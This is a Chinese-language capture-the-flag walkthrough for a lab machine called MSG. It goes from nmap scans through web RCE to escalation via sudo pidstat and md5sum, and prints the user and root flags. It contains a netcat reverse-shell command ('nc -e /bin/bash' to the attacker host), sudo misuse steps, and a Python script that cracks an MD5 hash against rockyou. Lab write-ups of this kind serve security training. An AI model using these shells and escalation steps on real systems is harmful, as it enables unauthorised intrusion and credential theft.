# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 23:54 EDT
Nmap scan report for 192.168.21.1
Host is up (0.0018s latency).
MAC Address: CC:E0:DA:EB:34:A2 (Baidu Online Network Technology (Beijing))
Nmap scan report for 192.168.21.2
Host is up (0.00036s latency).
MAC Address: 08:00:27:63:34:EF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.4
Host is up (0.00021s latency).
MAC Address: 04:6C:59:BD:33:50 (Intel Corporate)
Nmap scan report for 192.168.21.6
Host is up (0.077s latency).
MAC Address: C2:AB:39:9E:98:94 (Unknown)
Nmap scan report for 192.168.21.10
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.35 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.2 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 23:56 EDT
Nmap scan report for 192.168.21.2
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:63:34:EF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.02 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sU --min-rate 10000 -p- 192.168.21.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 23:57 EDT
Warning: 192.168.21.2 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.21.2
Host is up (0.0028s latency).
All 65535 scanned ports on 192.168.21.2 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 08:00:27:63:34:EF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 72.86 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p22,80 192.168.21.2      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 23:58 EDT
Nmap scan report for 192.168.21.2
Host is up (0.00043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
MAC Address: 08:00:27:63:34:EF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.28 seconds
```

# 漏洞利用

80端口一个登录页面

![image](https://github.com/user-attachments/assets/1f2bbc13-ec82-41c7-8a0b-13fc84f0550f)

尝试万能密码，没有成功

注册一个账号成功进入网站

![image](https://github.com/user-attachments/assets/bbac5b57-31ea-49ed-8ce4-22d96a18aadc)

尝试RCE

![image](https://github.com/user-attachments/assets/aa3195e6-e412-4013-aed8-b3c4a636e79d)

![image](https://github.com/user-attachments/assets/bfef529b-2f48-4aec-939f-42d0af16bd9e)

反弹一个shell

![image](https://github.com/user-attachments/assets/5c1f5aec-d09d-49e0-8db9-1ebdb27c67c4)

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.21.10] from (UNKNOWN) [192.168.21.2] 57794
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

看一下都有什么

```
www-data@MSG:~$ ls -la
ls -la
total 16
drwxr-xr-x  3 root     root     4096 Nov 21  2022 .
drwxr-xr-x 12 root     root     4096 Nov 20  2022 ..
-rw-r-----  1 root     root       12 Nov 21  2022 ROOTPASS
drwxrwxr--  5 www-data www-data 4096 Nov 18  2022 html
www-data@MSG:~$ sudo -l
sudo -l
Matching Defaults entries for www-data on MSG:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on MSG:
    (messagemaster) NOPASSWD: /bin/pidstat
www-data@MSG:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/newgrp
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
www-data@MSG:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
www-data@MSG:~$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
messagemaster:x:1000:1000:MessageMaster,,,:/home/messagemaster:/bin/bash
```

![image](https://github.com/user-attachments/assets/b335e92d-82d0-42e6-91b7-eb890de36aa4)

提权

```
www-data@MSG:/tmp$ cat shell.sh
cat shell.sh
nc -e /bin/bash 192.168.21.10 1234
www-data@MSG:/tmp$ COMMAND=./shell.sh
COMMAND=./shell.sh
www-data@MSG:/tmp$ sudo -u messagemaster /bin/pidstat -e $COMMAND
sudo -u messagemaster /bin/pidstat -e $COMMAND
Linux 5.10.0-19-amd64 (MSG)     06/12/25        _x86_64_       (1 CPU)

04:44:29      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
04:44:29     1000       586    0.00    0.00    0.00    0.00    0.00     0  pidstat
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.21.10] from (UNKNOWN) [192.168.21.2] 45588
id
uid=1000(messagemaster) gid=1000(messagemaster) groups=1000(messagemaster),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth)
```

user

```
messagemaster@MSG:~$ cat User.txt
cat User.txt
ea86091a17126fe48a83c1b8d13d60ab
```

看一下有什么

```
messagemaster@MSG:~$ sudo -l
sudo -l
Matching Defaults entries for messagemaster on MSG:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User messagemaster may run the following commands on MSG:
    (ALL) NOPASSWD: /bin/md5sum
```

![image](https://github.com/user-attachments/assets/23d83445-94dc-4155-a1df-4fff1551240f)

提权

```
messagemaster@MSG:~$ sudo -u root /bin/md5sum /var/www/ROOTPASS
sudo -u root /bin/md5sum /var/www/ROOTPASS
85c73111b30f9ede8504bb4a4b682f48  /var/www/ROOTPASS
┌──(kali㉿kali)-[~]
└─$ python 1.py                                  
Starting search in /usr/share/wordlists/rockyou.txt for hash 85c73111b30f9ede8504bb4a4b682f48...
Processed 1,000,000 words... Still searching.
Processed 2,000,000 words... Still searching.
Processed 3,000,000 words... Still searching.
Processed 4,000,000 words... Still searching.
Processed 5,000,000 words... Still searching.
Processed 6,000,000 words... Still searching.
Processed 7,000,000 words... Still searching.
Processed 8,000,000 words... Still searching.
Processed 9,000,000 words... Still searching.
Processed 10,000,000 words... Still searching.

!!! Password FOUND !!!
The word from rockyou.txt is: Message5687
(This means the content of ROOTPASS was: Message5687\n)

python：
import hashlib

target_hash = "85c73111b30f9ede8504bb4a4b682f48"
password_found = False  # Eine Variable, um zu verfolgen, ob wir es gefunden haben

# Stelle sicher, dass der Pfad zu rockyou.txt korrekt ist
wordlist_path = "/usr/share/wordlists/rockyou.txt"

try:
    with open(wordlist_path, "r", encoding='utf-8', errors='ignore') as file:
        print(f"Starting search in {wordlist_path} for hash {target_hash}...")
        for line_number, line in enumerate(file, 1):
            word = line.strip()
            
            # Deine Logik: Wort + Newline
            candidate_string = word + "\n"
            hash_password = hashlib.md5(candidate_string.encode('utf-8')).hexdigest()
            
            if hash_password == target_hash:
                print(f"\n!!! Password FOUND !!!")
                print(f"The word from rockyou.txt is: {word}")
                print(f"(This means the content of ROOTPASS was: {word}\\n)")
                password_found = True
                break # Schleife verlassen, da Passwort gefunden wurde
            
            # Fortschrittsanzeige (optional, aber hilfreich bei langen Listen)
            if line_number % 1000000 == 0: # Alle 1 Mio. Wörter
                print(f"Processed {line_number:,} words... Still searching.")

except FileNotFoundError:
    print(f"Error: Wordlist not found at {wordlist_path}")
    exit()

if not password_found:
    print(f"\nPassword for hash {target_hash} not found in {wordlist_path} with the 'word + newline' logic.")
```

root

```
root@MSG:~# cat Root.txt 
a59b23da18102898b854f3034f8b8b0f
```
